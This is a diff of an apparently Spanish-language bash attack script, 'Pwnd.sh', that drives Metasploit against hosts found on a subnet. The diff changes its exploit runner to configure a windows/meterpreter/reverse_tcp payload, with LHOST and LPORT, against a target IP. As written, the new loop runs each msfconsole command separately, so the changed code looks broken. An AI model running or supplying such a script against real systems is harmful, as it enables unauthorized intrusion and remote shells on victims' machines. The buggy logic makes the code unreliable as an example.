@@ -39,15 +39,6 @@ command -v msfconsole >/dev/null 2>&1 || { echo>&2 "${RED}Se requiere msfconsole
 echo "${CYAN}Pwnd.sh preparado para vulnerar sistemas!${RESET}"
 sleep 3
 
-# Función para ejecutar metasploit
-metasploit_runner(){
-        # Ejecutar comandos de Metasploit
-        for comando in "${comandos_metasploit[@]}"; do
-            echo "Ejecutando: $comando"
-            sudo msfconsole -q -x "$comando"
-        done
-}
-
 # Función para encontrar hosts en una subred
 host_finder() {
     clear
@@ -112,9 +103,13 @@ exploit_runner() {
         clear
         echo "${CYAN}¡Atacando con la vulnerabilidad ${BOLD}$vuln${CYAN} al host ${BOLD}$ip2${CYAN}!${RESET}"
         
-        # Ejecutar Metasploit
-        msfconsole -q -x "use $vuln; set RHOSTS $ip2; run;"
-        
+        # Guardar comandos para Metasploit
+        comandos_metasploit=("use $vuln" "set PAYLOAD windows/meterpreter/reverse_tcp" "set LHOST 127.0.0.1" "set LPORT 4444" "set RHOST $ip2")
+        # Ejecutar comandos de Metasploit
+        for comando in "${comandos_metasploit[@]}"; do
+            echo "Ejecutando: $comando"
+            sudo msfconsole -q -x "$comando"
+        done
     done
 
     echo "${BOLD}${UNDERLINE}=================================================================================${RESET}"
